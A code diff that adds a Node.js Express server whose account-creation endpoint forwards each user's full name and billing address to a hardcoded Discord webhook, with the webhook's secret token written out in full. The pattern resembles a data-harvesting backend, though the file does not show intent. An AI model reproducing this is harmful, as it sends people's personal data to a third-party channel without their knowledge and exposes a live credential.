@@ -1,0 +1,43 @@
+const express = require('express');
+const bodyParser = require('body-parser');
+const fetch = require('node-fetch'); // Add this line to use fetch
+const app = express();
+const port = 3000;
+
+// Replace 'YOUR_DISCORD_WEBHOOK_URL' with your actual Discord webhook URL
+const discordWebhookUrl = 'https://discord.com/api/webhooks/1174029881508634714/RA6m0QqjbF2-HrwnppRF0ZvPzstlcudg2zvhLD8G29o6xMT8pajkWB-6cNKmUqotFQhj';
+
+app.use(bodyParser.json());
+
+app.post('/createAccount', (req, res) => {
+  const accountData = req.body;
+
+  // Handle your Discord webhook logic here for account recovery
+  sendToDiscordWebhook(accountData);
+
+  // Send a response to the client
+  res.json({ success: true });
+});
+
+function sendToDiscordWebhook(accountData) {
+  fetch(discordWebhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      content: `New Account Created!\nFull Name: ${accountData.fullName}\nBilling Address: ${accountData.billingAddress}`,
+    }),
+  })
+  .then(response => response.json())
+  .then(data => {
+    console.log('Discord webhook response:', data);
+  })
+  .catch(error => console.error('Error sending to Discord webhook:', error));
+}
+
+app.use(express.static('public'));
+
+app.listen(port, () => {
+  console.log(`Server is running at http://localhost:${port}`);
+});
